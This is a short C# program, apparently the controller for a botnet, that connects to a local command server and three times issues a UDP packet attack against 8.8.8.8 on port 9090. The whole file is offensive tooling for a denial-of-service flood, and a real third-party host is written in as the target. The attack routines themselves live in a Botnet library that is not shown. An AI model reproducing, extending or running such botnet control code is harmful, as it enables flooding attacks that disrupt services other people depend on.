using System;
using System.Net;
using System.Threading;

namespace BotnetController
{
	internal class Program
	{
		static void Main(string[] args)
		{
			Console.WriteLine("Controller");


			Console.WriteLine("\n\n");

			Console.WriteLine("Send test Attack");
			Botnet.ControllerConnection Controller = new Botnet.ControllerConnection(IPAddress.Parse("127.0.0.1"), 4545);
			Console.WriteLine("press key to send");
			Console.ReadKey();
			Controller.SendAttack(Botnet.Attacks.Packet.UDP, "8.8.8.8", 9090, 15);
			Controller.SendAttack(Botnet.Attacks.Packet.UDP, "8.8.8.8", 9090, 15);
			Controller.SendAttack(Botnet.Attacks.Packet.UDP, "8.8.8.8", 9090, 15);
			Console.WriteLine("Attack sent");


			while (true)
				Thread.Sleep(1000);

		}
	}
}
